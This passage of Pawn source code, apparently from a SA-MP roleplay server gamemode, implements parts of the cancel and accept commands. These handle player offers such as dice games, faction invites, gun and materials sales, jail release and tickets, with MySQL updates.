		else if(strcmp(x_job,"repair",true) == 0)
		{
			if(RepairOffer[playerid] == 999) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you repair.");
			RepairOffer[playerid] = 999;
			RepairPrice[playerid] = 0;
			RepairCar[playerid] = 0;
		}
		else if(strcmp(x_job,"accept",true) == 0)
		{
			if(AcceptOffer[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you accept.");
			AcceptOffer[playerid] = -1;
			AcceptPrice[playerid] = 0;
		}
		else if(strcmp(x_job,"materials",true) == 0)
		{
			if(MatsOffer[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you materials.");
			MatsOffer[playerid] = -1;
			MatsPrice[playerid] = 0;
			MatsAmmo[playerid] = 0;
		}
		else if(strcmp(x_job,"gun",true) == 0)
		{
			if(SellgunOffer[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you gun.");
			SellgunOffer[playerid] = -1;
			SellgunPrice[playerid] = 0;
			SellgunMats[playerid] = 0;
			SellgunAmmo[playerid] = 0;
			SellgunID[playerid] = 0;
		}
		else if(strcmp(x_job,"find",true) == 0)
		{
			if(UsedFind[playerid] == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}At the moment you have not searched for anyone.");
			if(UsedFind[playerid] == 1)
			{
				UsedFind[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				GameTextForPlayer(playerid, "~r~redmarker gone", 2500, 1);
				foreach(Player, i)
				{
					if(IsACop(playerid))
					{
					    if(caser[playerid] == i)
					    {
							cased[i] --;
							caser[playerid] = 1001;
						}
					}
				}
			}
		}
		else if(strcmp(x_job,"live",true) == 0)
		{
			if(LiveOffer[playerid] == 999) return SCM(playerid,COLOR_SERVER,"{FFB870}No one will offered a live.");
			LiveOffer[playerid] = 999;
		}
		else if(strcmp(x_job,"refill",true) == 0)
		{
			if(RefillOffer[playerid] == 999) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you refill.");
			RefillOffer[playerid] = 999;
			RefillPrice[playerid] = 0;
		}
		else if(strcmp(x_job,"ticket",true) == 0)
		{
			if(TicketOffer[playerid] == 999) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you ticket.");
			TicketOffer[playerid] = 999;
			TicketMoney[playerid] = 0;
			ticketmuie[playerid] = -1;
		}
		else if(strcmp(x_job,"medic",true) == 0)
		{
			if(MedicCall[playerid] == playerid)
			{
				MedicCall[playerid] = -1;
			}
			else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You are not the current caller.");
		}
		else if(strcmp(x_job,"mechanic",true) == 0)
		{
			if(MechanicCall[playerid] == playerid)
			{
				MechanicCall[playerid] = -1;
				new sendername[30];
				GetPlayerName(playerid,sendername,sizeof(sendername));
				format(string, sizeof(string), "** %s has canceled the call to a mechanic.", sendername);
		    	SendFamilyMessage(8, TEAM_AZTECAS_COLOR, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You are not the current caller.");
		}
		else if(strcmp(x_job,"taxi",true) == 0)
		{
			if(TaxiCall[playerid] == playerid)
			{
			    if(TransportDuty[playerid] == 1 && TaxiCallTime[playerid] > 0)
			    {
			        TaxiAccepted[playerid] = 999;
			        SCM(playerid,COLOR_LIGHTBLUE,"You have canceled the call.");
					TaxiCallTime[playerid] = 0;
					DisablePlayerCheckpoint(playerid);
					TaxiCall[playerid] = -1;
			    }
			    else
			    {
					if(IsPlayerConnected(TaxiCall[playerid]))
					{
						if(TaxiCall[playerid] == playerid)
						{
							TaxiCall[playerid] = -1;
						}
					}
					foreach(Player,i)
					{
						 if(IsPlayerConnected(i))
						 {
						     if(TaxiAccepted[i] < 999)
						     {
							     if(TaxiAccepted[i] == playerid)
							     {
							         TaxiAccepted[i] = 999;
							         SCM(i,COLOR_LIGHTBLUE,"Taxi caller canceled the call.");
							         TaxiCallTime[i] = 0;
							         DisablePlayerCheckpoint(i);
							     }
						    }
						}
					}
				}
			}
			else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You are not the current caller.");
		}
	}
	return 1;
}
CMD:accept(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new x_job[256],
			id,
			sendername[25],
			giveplayer[25],
			string[300],
			tmpcar = GetPlayerVehicleID(playerid),
			ccar = IsPlayerInAnyVehicle(playerid);
		if(sscanf(params, "s[256]u",x_job,id))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/accept <Name> <Name/Playerid>");
			SendClientMessage(playerid, COLOR_SERVER, "Available names: Drugs, Repair, Materials, Dice, Fight.");
			SendClientMessage(playerid, COLOR_SERVER, "Available names: Vehicle, Taxi, Medic, Live, Lawyer, Carrace.");
			SendClientMessage(playerid, COLOR_SERVER, "Available names: Mechanic, Ticket, Refill, Invite, Free, Trade.");
			return 1;
		}
		if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		if(strcmp(x_job, "trade", true) == 0)
		{
			if(in_afacere_cu[playerid] >= 0) return SCM(playerid, COLOR_ERROR, "Already in business.");
			if(invitatie_trade[id] != playerid) return SCM(playerid, COLOR_ERROR, "That player does not get invited to a business.");
			new id_jucator = id;
			if(id_jucator < 1 && !IsPlayerConnected(id_jucator)) return SCM(playerid, COLOR_ERROR, "You have not received invitation to a business.");
			if(!ProxDetectorS(5.0, playerid, id_jucator)) return SCM(playerid, COLOR_ERROR, "The player who has invited business is not near you!");
			Afacere(playerid, id_jucator, true);
		}
		else if(strcmp(x_job,"dice",true) == 0)
		{
			if(Diceid[playerid] == 999) return SCM(playerid,COLOR_SERVER,"No player not invited you to play craps.");
			if(Diceid[playerid] != id) return SCM(playerid,COLOR_SERVER,"That player not invited you to play craps with him.");
			if(GetPlayerCash(playerid) < Dicem[playerid]) return SCM(playerid,COLOR_SERVER,"You and your opponent does not have enough money to play craps.");
		    if(GetPlayerCash(id) < Dicem[playerid]) return SCM(playerid,COLOR_SERVER,"You and your opponent does not have enough money to play craps.");
			if(ProxDetectorS(10.0, playerid, Diceid[playerid]))
			{
			   	new dice1[MAX_PLAYERS],dice2[MAX_PLAYERS],total[MAX_PLAYERS];
			    dice1[playerid] = random(6) + 1;
				dice2[playerid] = random(6) + 1;
				total[playerid] = dice1[playerid] + dice2[playerid];
			    dice1[Diceid[playerid]] = random(6) + 1;
				dice2[Diceid[playerid]] = random(6) + 1;
				total[Diceid[playerid]] = dice1[Diceid[playerid]] + dice2[Diceid[playerid]];
			    GetPlayerName(playerid,sendername,sizeof(sendername));
			    GetPlayerName(Diceid[playerid],giveplayer,sizeof(giveplayer));
			    if(total[playerid] > total[Diceid[playerid]])
			    {
					format(string,sizeof(string),"%s rolls %d %d. %s rolls %d %d. %s won $%s.",sendername,dice1[playerid],dice2[playerid],giveplayer,dice1[Diceid[playerid]],dice2[Diceid[playerid]],sendername,FormatNumber(Dicem[playerid]));
					ProxDetector(10.0,playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid,Dicem[playerid]);
					GivePlayerCash(Diceid[playerid],-Dicem[playerid]);
					format(string,sizeof(string),"(+) Ai castigat $%s!",FormatNumber(Dicem[playerid]));
					SendClientMessage(playerid, COLOR_GREEN, string);
					format(string,sizeof(string),"(-) Ai pierdut $%s!",FormatNumber(Dicem[playerid]));
					SendClientMessage(Diceid[playerid], COLOR_GREEN, string);
				}
				if(total[Diceid[playerid]] > total[playerid])
				{
					format(string,sizeof(string),"%s rolls %d %d. %s rolls %d %d. %s won $%s.",sendername,dice1[playerid],dice2[playerid],giveplayer,dice1[Diceid[playerid]],dice2[Diceid[playerid]],giveplayer,FormatNumber(Dicem[playerid]));
					ProxDetector(10.0,playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid,-Dicem[playerid]);
					GivePlayerCash(Diceid[playerid],Dicem[playerid]);
					format(string,sizeof(string),"(+) Ai castigat $%s!",FormatNumber(Dicem[playerid]));
					SendClientMessage(Diceid[playerid], COLOR_GREEN, string);
					format(string,sizeof(string),"(-) Ai pierdut $%s!",FormatNumber(Dicem[playerid]));
					SendClientMessage(playerid, COLOR_GREEN, string);
				}
				if(total[Diceid[playerid]] == total[playerid])
				{
					format(string,sizeof(string),"%s rolls %d %d. %s rolls %d %d. No one won.",sendername,dice1[playerid],dice2[playerid],giveplayer,dice1[Diceid[playerid]],dice2[Diceid[playerid]]);
					ProxDetector(10.0,playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				Update(playerid, pCashx);
				Update(Diceid[playerid], pCashx);
				Diceid[playerid] = 999;
				Dicem[playerid] = 0;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "Nu esti langa acel player.");
			return 1;
		}
		else if(strcmp(x_job,"invite",true) == 0)
		{
		    if(FactionOffer[playerid] != 999)
		    {
		        new str[256],d,m,y,h,mi,s,szName[500],str333[500];
				gettime(h,mi,s);
				getdate(y,m,d);
				if(PlayerInfo[playerid][pClan] > 0)
				{
					format(szName, sizeof(szName), "%s", PlayerInfo[playerid][pNormalName]);
	    			SetPlayerName(playerid, szName);
					PlayerInfo[playerid][pClanTag] = 0;
	    			mysql_format(SQL,str333, sizeof(str333), "UPDATE users SET `ClanTag`='0' WHERE `name`='%s'", PlayerInfo[playerid][pNormalName]);
			 		mysql_tquery(SQL,str333,"","");

				}
		        GetPlayerName(FactionOffer[playerid], sendername, sizeof(sendername));
		        GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				new para1 = playerid, ftext[30];
				if(PlayerInfo[FactionOffer[playerid]][pMember] == 1) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "LSPD"; ChosenSkin[para1] = 71; SetPlayerSkin(para1, 71); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 2) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "FBI"; ChosenSkin[para1] = 163; SetPlayerSkin(para1, 163); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 3) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "National Guard"; ChosenSkin[para1] = 287; SetPlayerSkin(para1, 287); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 4) { PlayerInfo[para1][pTeam] = 5; gTeam[para1] = 5; ftext = "Los Aztecas"; ChosenSkin[para1] = 116; SetPlayerSkin(para1, 116); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 5) { PlayerInfo[para1][pTeam] = 5; gTeam[para1] = 5; ftext = "Grove Street"; ChosenSkin[para1] = 106; SetPlayerSkin(para1, 106); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 6) { PlayerInfo[para1][pTeam] = 5; gTeam[para1] = 5; ftext = "Los Vagos"; ChosenSkin[para1] = 176; SetPlayerSkin(para1, 176); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 8) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "LVPD"; ChosenSkin[para1] = 71; SetPlayerSkin(para1, 71); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 9) { PlayerInfo[para1][pTeam] = 4; gTeam[para1] = 4; ftext = "News Reporter"; ChosenSkin[para1] = 17; SetPlayerSkin(para1, 17); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 10) { PlayerInfo[para1][pTeam] = 5; gTeam[para1] = 5; ftext = "Ballas"; ChosenSkin[para1] = 104; SetPlayerSkin(para1, 104); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 11) { PlayerInfo[para1][pTeam] = 11; gTeam[para1] = 11; ftext = "Hitman Agency"; ChosenSkin[para1] = 208; SetPlayerSkin(para1, 208); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 12) { PlayerInfo[para1][pTeam] = 4; gTeam[para1] = 4; ftext = "School Instructors"; ChosenSkin[para1] = 153; SetPlayerSkin(para1, 153); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 13) { PlayerInfo[para1][pTeam] = 4; gTeam[para1] = 4; ftext = "Taxi"; ChosenSkin[para1] = 253; SetPlayerSkin(para1, 253); }
				else if(PlayerInfo[FactionOffer[playerid]][pMember] == 14) { PlayerInfo[para1][pTeam] = 4; gTeam[para1] = 4; ftext = "Paramedic"; ChosenSkin[para1] = 276; SetPlayerSkin(para1, 276); }
                else if(PlayerInfo[FactionOffer[playerid]][pMember] == 15) { PlayerInfo[para1][pTeam] = 2; gTeam[para1] = 2; ftext = "SFPD"; ChosenSkin[para1] = 71; SetPlayerSkin(para1, 71); }
				else { return 1; }
                PlayerInfo[para1][pMember] = PlayerInfo[FactionOffer[playerid]][pMember];
				PlayerInfo[para1][pRank] = 1;
				PlayerInfo[para1][pModel] = ChosenSkin[para1];
				SetPlayerVirtualWorld(para1,0);
				SetSpawnInfo(playerid, PlayerInfo[para1][pTeam], PlayerInfo[para1][pModel],0.0,0.0,0.0,0,0,0,0,0,0,0);
		    	gTeam[para1] = PlayerInfo[para1][pTeam];
				SetPlayerToTeamColor(para1);
				SpawnPlayer(para1);
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Team`='%d',`Member`='%d',`Rank`='1',`Model`='%d',`FactionJoin`='%02d-%02d-%d %02d:%02d:%02d' WHERE `name`='%s'",PlayerInfo[para1][pTeam],PlayerInfo[para1][pMember],PlayerInfo[para1][pModel],d,m,y,h,mi,s,PlayerInfo[para1][pNormalName]);
				mysql_tquery(SQL,str,"","");
				new string2[500],query[500];
				format(string,sizeof(string),"You are now a member of the %s.",ftext);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string,sizeof(string),"%s has joined the group (invited by %s).",giveplayer,sendername);
				SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, string);
				format(string2, sizeof(string2), "%s has joined the group %s (invited by %s).", giveplayer, ftext, sendername);
				mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`, `player`,`leader`) VALUES ('%s','%d','%d')", string2, PlayerInfo[para1][pSQLID],PlayerInfo[FactionOffer[playerid]][pSQLID]);
				mysql_tquery(SQL,query,"","");
				format(string2,sizeof(string2),"%s[user:%d] has joined the group %s (invited by %s[user:%d]).",giveplayer,PlayerInfo[para1][pSQLID],ftext,sendername,PlayerInfo[FactionOffer[playerid]][pSQLID]);
				Factionlog(PlayerInfo[para1][pMember],PlayerInfo[para1][pSQLID],PlayerInfo[FactionOffer[playerid]][pSQLID],string2);
			}
		}
	 	else if(strcmp(x_job,"free",true) == 0)
		{
            if(FreeOffer[playerid] > -1)
			{
                if(FreeOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you free.");
			    if(GetPlayerCash(playerid) < FreePrice[playerid]) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
			    GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				GetPlayerName(FreeOffer[playerid], sendername, sizeof(sendername));
				format(string, sizeof(string), "(+) %s She accepted the offer to be released and you received $%s.", giveplayer, FormatNumber(FreePrice[playerid]));
				SendClientMessage(FreeOffer[playerid], COLOR_GREEN, string);
				PlayerInfo[FreeOffer[playerid]][pRob] -= 3;
				format(string, sizeof(string), "You paid $%s to be released from prison.", FormatNumber(FreePrice[playerid]));
				SendClientMessage(playerid, COLOR_ERROR, string);
				JailPrice[playerid] = 0;
				PlayerInfo[playerid][pJailTime] = 1;
				GivePlayerCash(playerid, -FreePrice[playerid]);
				GivePlayerCash(FreeOffer[playerid],FreePrice[playerid]);
				PlayerInfo[playerid][pJailed] = 1;
				new str[356];
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `JailTime`='0',`Money`='%d',`Jailed`='0' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d' WHERE `name`='%s'",GetPlayerCash(FreeOffer[playerid]),PlayerInfo[FreeOffer[playerid]][pNormalName]);
				mysql_tquery(SQL,str,"","");
				//KillTimer(timerfree1[FreeOffer[playerid]]);
                FreeOffer[playerid] = -1;
                FreePlayer[playerid] = -1;
				FreePrice[playerid] = 0;
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offerd you free.");
		}
		else if(strcmp(x_job,"cinvite",true) == 0)
		{
	        if(GetPVarInt(playerid, "cinvID") >= 1)
			{
	            new messageString[128],str33[184],iddd,name2[30],strings[128];
	            PlayerInfo[playerid][pClan] = GetPVarInt(playerid, "cinvID");
				iddd = GetPVarInt(playerid, "cinvIDD");
				GetPlayerName(iddd,name2,sizeof(name2));
				PlayerInfo[playerid][pCRank] = 1;
				DeletePVar(playerid, "cinvID");
				DeletePVar(playerid, "cinvIDD");
				GetPlayerName(playerid,sendername,sizeof(sendername));
				format(messageString, sizeof(messageString), "{%s}[CLAN] %s joined the clan (invited by %s).",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],sendername,name2);
				SendToClan(PlayerInfo[playerid][pClan], COLOR_YELLOW, messageString);
				new y,m,d,h,mi,s;
				getdate(y,m,d);
				gettime(h,mi,s);
				mysql_format(SQL,str33,sizeof(str33),"UPDATE users SET `Clan`='%d',`CRank`='1',`ClanJoin`='%02d-%02d-%d %02d:%02d:%02d' WHERE `name`='%s'",PlayerInfo[playerid][pClan],d,m,y,h,mi,s,PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str33,"","");
				format(messageString, sizeof(messageString), "%s joined the clan (invited by %s).",sendername,name2);
				mysql_real_escape_string(messageString, strings);
				mysql_format(SQL,str33,sizeof(str33),"INSERT INTO clan_logs (`action`,`clanid`) VALUES ('%s','%d')",strings,PlayerInfo[playerid][pClan]);
				mysql_tquery(SQL,str33,"","");

	        }
	        else {
				return SendClientMessage(playerid, COLOR_GREY, "You don't have an active clan invite request.");
			}
	    }
		else if(strcmp(x_job,"lawyer",true) == 0)
		{
			if(AcceptOffer[playerid] > -1)
			{
			    if(AcceptOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you accept.");
			    if(GetPlayerCash(playerid) < AcceptPrice[playerid]) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
			    PlayerInfo[playerid][pLawyer] += 15;
			    PlayerInfo[AcceptOffer[playerid]][pLawyer] -= 15;
			    GivePlayerCash(playerid, - AcceptPrice[playerid]);
			    GivePlayerCash(AcceptOffer[playerid], AcceptPrice[playerid]);
			    new wakaname[25],
			    	str[356],
			    	wakaname2[25],
			    	str2[356];
				GetPlayerName(playerid,wakaname,25);
				mysql_format(SQL,str,356,"UPDATE users SET `Money`='%d',`Acceptpoints`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pLawyer],wakaname);
				mysql_tquery(SQL,str,"","");
				GetPlayerName(AcceptOffer[playerid],wakaname2,25);
				mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `Money`='%d',`Acceptpoints`='%d' WHERE `name`='%s'",GetPlayerCash(AcceptOffer[playerid]),PlayerInfo[AcceptOffer[playerid]][pLawyer],wakaname2);
				mysql_tquery(SQL,str2,"","");
				format(string,sizeof(string),"{B8FFDB}%s bought your accept.",wakaname);
			    SCM(AcceptOffer[playerid],COLOR_SERVER,string);
				format(string,sizeof(string),"{B8FFDB}You bought accept from %s.",wakaname2);
			    SCM(playerid,COLOR_SERVER,string);
			    AcceptOffer[playerid] = -1;
			    AcceptPrice[playerid] = 0;
			    return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offerd you accept.");
		}
		else if(strcmp(x_job,"materials",true) == 0)
		{
			if(MatsOffer[playerid] > -1)
			{
			    if(MatsOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you materials.");
			    if(GetPlayerCash(playerid) < MatsPrice[playerid]) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
				PlayerInfo[playerid][pMats] += MatsAmmo[playerid];
				PlayerInfo[MatsOffer[playerid]][pMats] -= MatsAmmo[playerid];
			    GivePlayerCash(playerid, - MatsPrice[playerid]);
			    GivePlayerCash(MatsOffer[playerid], MatsPrice[playerid]);
			    GetPlayerName(MatsOffer[playerid],giveplayer,sizeof(giveplayer));
			    GetPlayerName(playerid,sendername,sizeof(sendername));
			    format(string,sizeof(string),"{B8FFDB}You buy %d materials for $%s from %s.",MatsAmmo[playerid],FormatNumber(MatsPrice[playerid]),giveplayer);
				SCM(playerid,COLOR_SERVER,string);
			    format(string,sizeof(string),"{B8FFDB}%s bought your materials for $%s.",sendername,FormatNumber(MatsPrice[playerid]));
				SCM(MatsOffer[playerid],COLOR_SERVER,string);
		        Update(playerid,pMatsx);
		        Update(MatsOffer[playerid],pMatsx);
		        Update(MatsOffer[playerid],pCashx);
				Update(playerid,pCashx);
				MatsOffer[playerid] = -1;
				MatsAmmo[playerid] = 0;
				MatsPrice[playerid] = 0;
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offerd you materials.");
		}
		else if(strcmp(x_job,"gun",true) == 0)
		{
			if(SellgunOffer[playerid] > -1)
			{
			    if(SellgunOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you gun.");
			    if(GetPlayerCash(playerid) < SellgunPrice[playerid]) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
			    new weaponid,ammo,price,mats,gunname[60],idoffer;
			    weaponid = SellgunID[playerid];
			    ammo = SellgunAmmo[playerid];
				price = SellgunPrice[playerid];
				mats = SellgunMats[playerid];
				idoffer = SellgunOffer[playerid];
			    GivePlayerWeaponEx(playerid,weaponid,ammo);
				PlayerInfo[idoffer][pMats] -= mats;
				GivePlayerCash(playerid, -price);
			    GivePlayerCash(idoffer, price);
				Update(playerid, pCashx);
				Update(idoffer,pMatsx);
				Update(idoffer, pCashx);
				GetPlayerName(idoffer,giveplayer,sizeof(giveplayer));
			    GetPlayerName(playerid,sendername,sizeof(sendername));
				GetWeaponNameEx(weaponid,gunname,sizeof(gunname));
				format(string, sizeof(string), "You have given %s, a %s with %d ammo, for %d Materials.", sendername,gunname, ammo,mats);
				SendClientMessage(idoffer, COLOR_GRAD1, string);
				format(string, sizeof(string), "You have recieved a %s with %d ammo from %s.", gunname, ammo, giveplayer);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(string, sizeof(string), "* %s created a Gun from Materials, and hands it to %s.", giveplayer ,sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SellgunOffer[playerid] = -1;
				SellgunPrice[playerid] = 0;
				SellgunMats[playerid] = 0;
				SellgunAmmo[playerid] = 0;
				SellgunID[playerid] = 0;
				if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER)
				{
			        new gun2,tmp;
			        GetPlayerWeaponData(playerid,5,gun2,tmp);
			        #pragma unused tmp
			        if(gun2)SetPlayerArmedWeapon(playerid,gun2);
			        else SetPlayerArmedWeapon(playerid,0);
				}
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offerd you materials.");
		}
		else if(strcmp(x_job,"ticket",true) == 0)
		{
			if(TicketOffer[playerid] < 999)
			{
				if(TicketOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you ticket.");
			    if(IsPlayerConnected(TicketOffer[playerid]))
			    {
			        if (ProxDetectorS(8.0, playerid, TicketOffer[playerid]))
					{
					    if(ticketgivened[TicketOffer[playerid]] == 1)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 30000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $30.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $30.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 30000);
							GivePlayerCash(TicketOffer[playerid], 30000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
						if(ticketgivened[TicketOffer[playerid]] == 2)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 30000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $30.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $30.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 30000);
							GivePlayerCash(TicketOffer[playerid], 30000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
						if(ticketgivened[TicketOffer[playerid]] == 3)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 25000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $25.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $25.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 25000);
							GivePlayerCash(TicketOffer[playerid], 25000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
						if(ticketgivened[TicketOffer[playerid]] == 4)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 25000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $25.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $25.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 25000);
							GivePlayerCash(TicketOffer[playerid], 25000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
						if(ticketgivened[TicketOffer[playerid]] == 5)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 10000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $10.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $10.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 10000);
							GivePlayerCash(TicketOffer[playerid], 10000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
						if(ticketgivened[TicketOffer[playerid]] == 6)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $5.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $5.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
